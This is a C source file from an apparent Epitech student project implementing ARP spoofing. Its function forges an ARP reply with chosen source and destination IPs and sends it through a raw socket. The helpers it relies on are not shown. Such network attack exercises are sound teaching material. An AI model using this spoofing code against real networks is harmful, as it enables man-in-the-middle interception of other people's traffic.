/*
** EPITECH PROJECT, 2018
** NWP_myarpspoof_2018
** File description:
** spoof.c
*/

#include "arpspoofing.h"

int send_spoof(arp_t *arp)
{
    struct ethhdr *send_req = (struct ethhdr *)arp->buffer;
    arphdr_t *arp_req = (arphdr_t *)(arp->buffer + ETH2_LEN);

    init_arph(arp);
    set_header1(arp, send_req, arp_req);
    init_reply(send_req, arp_req);

    memcpy(arp_req->src_ip, &arp->src, sizeof(uint32_t));
    memcpy(arp_req->dest_ip, &arp->dst, sizeof(uint32_t));

    arp->ret = sendto(arp->fd, arp->buffer, 42, 0,
        (struct sockaddr *)&arp->socket_address, sizeof(arp->socket_address));
    if (arp->ret == -1)
        error("Sendto failed");

    printf("Spoofed packet sent to '%s'\n", arp->dest);
    sleep(1);

    return (0);
}